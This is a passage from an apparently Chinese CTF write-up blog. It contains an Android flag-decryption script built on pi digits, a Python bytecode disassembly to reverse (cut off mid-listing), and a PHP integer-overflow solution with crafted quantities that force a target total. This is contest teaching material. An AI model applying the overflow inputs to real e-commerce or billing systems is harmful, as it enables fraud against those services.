class="number">720</span>, RoundingMode.HALF_UP);</span><br><span class="line"><span class="keyword">int</span> inds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">    v2_1 = a.a(<span class="keyword">new</span> BigDecimal(<span class="string">&quot;2&quot;</span>).subtract(a.a(<span class="keyword">new</span> BigDecimal(<span class="number">4</span>).subtract(v2_1.multiply(v2_1, MathCtx2), MathCtx2), MathCtx2)), MathCtx2);</span><br><span class="line">    v4_2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;2&quot;</span>).multiply(v4_2, MathCtx1);</span><br><span class="line">    v10 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0.5&quot;</span>).multiply(v2_1.multiply(v4_2, MathCtx1), MathCtx1);</span><br><span class="line">    <span class="keyword">if</span>(v10.compareTo(v3_1) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ++inds;</span><br><span class="line">    <span class="keyword">if</span>(inds % <span class="number">30</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        StringBuilder v3_2 = b.a.a.a.a.e(<span class="string">&quot;running: &quot;</span>);</span><br><span class="line">        v3_2.append(inds / <span class="number">6</span>);</span><br><span class="line">        v3_2.append(<span class="string">&quot;%&quot;</span>);</span><br><span class="line">        Log.i(<span class="string">&quot;StudyDesk:&quot;</span>, v3_2.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v3_1 = v10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Log.i(<span class="string">&quot;StudyDesk:&quot;</span>, <span class="string">&quot;running: 100%&quot;</span>);</span><br><span class="line">String aimString = v10.toString().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>解密代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pi = <span class="string">&quot;314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036&quot;</span></span><br><span class="line">aimBytes = []</span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pi), <span class="number">2</span>):</span><br><span class="line">    aimBytes.append(<span class="built_in">int</span>(pi[ind:ind+<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">staticBytes = [<span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">43</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">45</span>, <span class="number">0x30</span>, <span class="number">36</span>, <span class="number">84</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">66</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">84</span>, <span class="number">0x79</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">0x6F</span>, <span class="number">51</span>, <span class="number">66</span>, <span class="number">89</span>, <span class="number">49</span>, <span class="number">69</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">0x74</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">98</span>, <span class="number">0x72</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">98</span>, <span class="number">50</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">107</span>, <span class="number">66</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">66</span>, <span class="number">50</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">0x5F</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x79</span>, <span class="number">0x5F</span>, <span class="number">0x40</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">50</span>, <span class="number">0x40</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">43</span>, <span class="number">36</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x40</span>, <span class="number">49</span>, <span class="number">0x72</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">0x40</span>, <span class="number">0x79</span>, <span class="number">53</span>, <span class="number">36</span>, <span class="number">0x40</span>, <span class="number">69</span>, <span class="number">89</span>, <span class="number">98</span>, <span class="number">45</span>, <span class="number">0x6F</span>, <span class="number">101</span>, <span class="number">36</span>, <span class="number">97</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">97</span>, <span class="number">0x30</span>, <span class="number">36</span>, <span class="number">0x6F</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">0x5F</span>, <span class="number">49</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">89</span>, <span class="number">0x74</span>, <span class="number">85</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x73</span>, <span class="number">89</span>, <span class="number">43</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">0x72</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">38</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">51</span>, <span class="number">98</span>, <span class="number">0x75</span>, <span class="number">0x5F</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">84</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">0x6F</span>, <span class="number">100</span>, <span class="number">0x30</span>, <span class="number">0x6F</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">0x72</span>, <span class="number">0x40</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">0x72</span>, <span class="number">51</span>, <span class="number">84</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">0x40</span>, <span class="number">0x30</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">0x30</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">0x74</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">85</span>, <span class="number">97</span>, <span class="number">66</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">89</span>, <span class="number">45</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">101</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">0x5F</span>, <span class="number">51</span>, <span class="number">82</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">61</span>, <span class="number">101</span>, <span class="number">0x40</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">0x5F</span>, <span class="number">66</span>, <span class="number">0x74</span>, <span class="number">49</span>, <span class="number">0x40</span>, <span class="number">87</span>, <span class="number">97</span>, <span class="number">43</span>, <span class="number">0x5F</span>, <span class="number">0x73</span>, <span class="number">43</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">33</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">85</span>, <span class="number">0x30</span>, <span class="number">98</span>, <span class="number">98</span>, <span class="number">0x5F</span>, <span class="number">50</span>, <span class="number">107</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x6F</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">0x75</span>, <span class="number">51</span>, <span class="number">0x74</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">0x40</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">69</span>, <span class="number">0x40</span>, <span class="number">73</span>, <span class="number">0x5F</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">97</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit8</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flagTable = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">sb_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">180</span>, <span class="number">5</span>):</span><br><span class="line">    binString = bit8(aimBytes[ind])+bit8(aimBytes[ind+<span class="number">1</span>])+bit8(aimBytes[ind+<span class="number">2</span>])+bit8(aimBytes[ind+<span class="number">3</span>])+bit8(aimBytes[ind+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">for</span> indd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binString), <span class="number">5</span>):</span><br><span class="line">        index = <span class="built_in">int</span>(binString[indd:indd+<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        flagTable[index] = staticBytes[sb_index]</span><br><span class="line">        sb_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nflag: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flagTable:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h1><blockquote><p>中科大信安比赛</p></blockquote><p>猜测后台计算公式如下：</p><p>$$<br>   new_weight = old_weight + 6 \times b6 + 9 \times b9<br>$$</p><p>根据运算符的优先级，计算顺序如下：<br>$$<br>   new_weight = old_weight + (6 \times b6) + (9 \times b9)<br>$$</p><p>PHP 64位系统下，INT最大值是<code>9223372036854775807</code>，超出这个数字会被解释为float。<br>这里的乘法应该是用<code>9223372036854775807</code>作为最大值，但是加法的最大值更大。<br>或者说一旦构造了一个超过<code>9223372036854775807</code>的数字，系统里面的数值就被解释为float了，造成最大值变大。</p><p>总的来说，我们希望构造参数，使得 $(6 \times b6)$ 和$(9 \times b9)$偶尔溢出为负数的float，然后追加整数构造出20.</p><p>构造步骤如下：<br> <code>1024819115206086201 * 9 = 9223372036854775809 -&gt;(溢出为)-&gt; -9223372036854775808</code><br><code>-9223372036854775808 + 1024819115206086200 * 9 = -8</code><br> <code>-8 +  1024819115206086200 * 9 = 9223372036854775792</code><br> <code>9223372036854775792 + 1024819115206086201 * 9 = 9223372036854775792 + -9223372036854775808 = -16</code><br> <code>-16 + 6 * 6 = 20</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211026132532729.png" alt="image-20211026132532729"></p><h1 id="bytecode"><a href="#bytecode" class="headerlink" title="bytecode"></a>bytecode</h1><blockquote><p>天津市大学生信息安全大赛</p></blockquote><p>给出一条python的字节码代码，常见题型，人脑模拟逆向。可是我当时把<code>BINARY_AND</code>看成<code>BINARY_ADD</code>，然后没及时做出来。（恼<br><a href="https://docs.python.org/zh-cn/3.8/library/dis.html">dis – Python字节码反汇编器</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of main:</span><br><span class="line"> <span class="number">27</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">305419896</span>)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2271560481</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">3</span> (<span class="number">2427178479</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">4</span> (<span class="number">4275878409</span>)</span><br><span class="line">              <span class="number">8</span> BUILD_LIST               <span class="number">4</span></span><br><span class="line">             <span class="number">10</span> STORE_FAST               <span class="number">0</span> (key)</span><br><span class="line"></span><br><span class="line"> <span class="number">28</span>          <span class="number">12</span> LOAD_CONST               <span class="number">5</span> (<span class="number">3888592564</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">6</span> (<span class="number">3737879155</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4063334467</span>)</span><br><span class="line">             <span class="number">20</span> LOAD_CONST               <span class="number">8</span> (<span class="number">2214487552</span>)</span><br><span class="line">             <span class="number">22</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">9</span> (<span class="number">2420456096</span>)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST              <span class="number">10</span> (<span class="number">1529806583</span>)</span><br><span class="line">             <span class="number">28</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">30</span> LOAD_CONST              <span class="number">11</span> (<span class="number">2576007368</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST              <span class="number">12</span> (<span class="number">2328179940</span>)</span><br><span class="line">             <span class="number">34</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">36</span> LOAD_CONST              <span class="number">13</span> (<span class="number">1665686107</span>)</span><br><span class="line">             <span class="number">38</span> LOAD_CONST              <span class="number">14</span> (<span class="number">1748819876</span>)</span><br><span class="line">             <span class="number">40</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">42</span> BUILD_LIST               <span class="number">5</span></span><br><span class="line">             <span class="number">44</span> STORE_FAST               <span class="number">1</span> (arr)</span><br><span class="line"></span><br><span class="line"> <span class="number">29</span>          <span class="number">46</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">input</span>)</span><br><span class="line">             <span class="number">48</span> LOAD_CONST              <span class="number">15</span> (<span class="string">&#x27;please input your secret key: &#x27;</span>)</span><br><span class="line">             <span class="number">50</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">52</span> STORE_FAST               <span class="number">2</span> (flag)</span><br><span class="line"></span><br><span class="line"> <span class="number">31</span>          <span class="number">54</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">56</span> STORE_FAST               <span class="number">3</span> (encry)</span><br><span class="line"></span><br><span class="line"> <span class="number">32</span>          <span class="number">58</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">60</span> STORE_FAST               <span class="number">4</span> (encryted)</span><br><span class="line"></span><br><span class="line"> <span class="number">33</span>          <span class="number">62</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">range</span>)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">len</span>)</span><br><span class="line">             <span class="number">68</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">70</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">72</span> LOAD_CONST              <span class="number">17</span> (<span class="number">8</span>)</span><br><span class="line">             <span class="number">74</span> CALL_FUNCTION            <span class="number">3</span></span><br><span class="line">             <span class="number">76</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">78</span> FOR_ITER               <span class="number">112</span> (to <span class="number">192</span>)</span><br><span class="line">             <span class="number">80</span> STORE_FAST               <span class="number">5</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">34</span>          <span class="number">82</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">             <span class="number">84</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">             <span class="number">86</span> LOAD_GLOBAL              <span class="number">4</span> (struct)</span><br><span class="line">             <span class="number">88</span> LOAD_METHOD              <span class="number">5</span> (unpack)</span><br><span class="line">             <span class="number">90</span> LOAD_CONST              <span class="number">18</span> (<span class="string">&#x27;&lt;I&#x27;</span>)</span><br><span class="line">             <span class="number">92</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">94</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">             <span class="number">96</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">             <span class="number">98</span> LOAD_CONST              <span class="number">19</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">100</span> BINARY_ADD</span><br><span class="line">            <span class="number">102</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">            <span class="number">104</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">106</span> LOAD_METHOD              <span class="number">6</span> (encode)</span><br><span class="line">            <span class="number">108</span> LOAD_CONST              <span class="number">20</span> (<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="number">110</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">112</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line">            <span class="number">114</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">116</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">118</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">120</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">35</span>         <span class="number">122</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">124</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">            <span class="number">126</span> LOAD_GLOBAL              <span class="number">4</span> (struct)</span><br><span class="line">            <span class="number">128</span> LOAD_METHOD              <span class="number">5</span> (unpack)</span><br><span class="line">            <span class="number">130</span> LOAD_CONST              <span class="number">18</span> (<span class="string">&#x27;&lt;I&#x27;</span>)</span><br><span class="line">            <span class="number">132</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">            <span class="number">134</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">            <span class="number">136</span> LOAD_CONST              <span class="number">19</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">138</span> BINARY_ADD</span><br><span class="line">            <span class="number">140</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">            <span class="number">142</span> LOAD_CONST              <span class="number">17</span> (<span class="number">8</span>)</span><br><span class="line">            <span class="number">144</span> BINARY_ADD</span><br><span class="line">            <span class="number">146</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">            <span class="number">148</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">150</span> LOAD_METHOD              <span class="number">6</span> (encode)</span><br><span class="line">            <span class="number">152</span> LOAD_CONST              <span class="number">20</span> (<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="number">154</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">156</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line">            <span class="number">158</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">160</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">162</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">164</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">36</span>         <span class="number">166</span> LOAD_GLOBAL              <span class="number">7</span> (encrypt)</span><br><span class="line">            <span class="number">168</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">170</span> LOAD_FAST                <span class="number">0</span> (key)</span><br><span class="line">            <span class="number">172</span> CALL_FUNCTION            <span class="number">2</span></span><br><span class="line">            <span class="number">174</span> STORE_FAST               <span class="number">6</span> (encrypted)</span><br><span class="line"></span><br><span class="line"> <span class="number">37</span>         <span class="number">176</span> LOAD_FAST                <span class="number">4</span> (encryted)</span><br><span class="line">            <span class="number">178</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">            <span class="number">180</span> LOAD_FAST                <span class="number">6</span> (encrypted)</span><br><span class="line">            <span class="number">182</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">184</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">38</span>         <span class="number">186</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">188</span> STORE_FAST               <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">190</span> JUMP_ABSOLUTE           <span class="number">78</span></span><br><span class="line"></span><br><span class="line"> <span class="number">39</span>     &gt;&gt;  <span class="number">192</span> LOAD_FAST                <span class="number">4</span> (encryted)</span><br><span class="line">            <span class="number">194</span> LOAD_FAST                <span class="number">1</span> (arr)</span><br><span class="line">            <span class="number">196</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">            <span class="number">198</span> POP_JUMP_IF_FALSE      <span class="number">210</span></span><br><span class="line"></span><br><span class="line"> <span class="number">40</span>         <span class="number">200</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="built_in">print</span>)</span><br><span class="line">            <span class="number">202</span> LOAD_CONST              <span class="number">21</span> (<span class="string">&#x27;ok,fine~&#x27;</span>)</span><br><span class="line">            <span class="number">204</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">206</span> POP_TOP</span><br><span class="line">            <span class="number">208</span> JUMP_FORWARD             <span class="number">8</span> (to <span class="number">218</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">42</span>     &gt;&gt;  <span class="number">210</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="built_in">print</span>)</span><br><span class="line">            <span class="number">212</span> LOAD_CONST              <span class="number">22</span> (<span class="string">&#x27;sry~&#x27;</span>)</span><br><span class="line">            <span class="number">214</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">216</span> POP_TOP</span><br><span class="line">        &gt;&gt;  <span class="number">218</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">220</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of encrypt:</span><br><span class="line">  <span class="number">6</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">              <span class="number">4</span> BINARY_SUBSCR</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line">  <span class="number">7</span>           <span 